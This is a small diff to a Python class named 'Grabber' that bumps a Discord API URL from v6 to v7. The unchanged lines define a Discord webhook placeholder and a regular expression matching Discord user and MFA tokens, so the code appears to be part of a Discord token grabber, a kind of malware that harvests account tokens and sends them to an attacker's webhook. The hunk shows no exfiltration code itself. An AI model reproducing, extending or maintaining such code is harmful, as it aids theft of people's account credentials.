@@ -6,7 +6,7 @@ class Grabber:
     def __init__(self):
         self.webhook = "https://discordapp.com/api/webhooks/some nice webhook url here plz"
         self.tokenRegex = r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"
-        self.api = "https://discordapp.com/api/v6/"
+        self.api = "https://discordapp.com/api/v7/"
         self.errors = {
             1: 'Unauthorized',
             2: 'Invalid two-factor code'
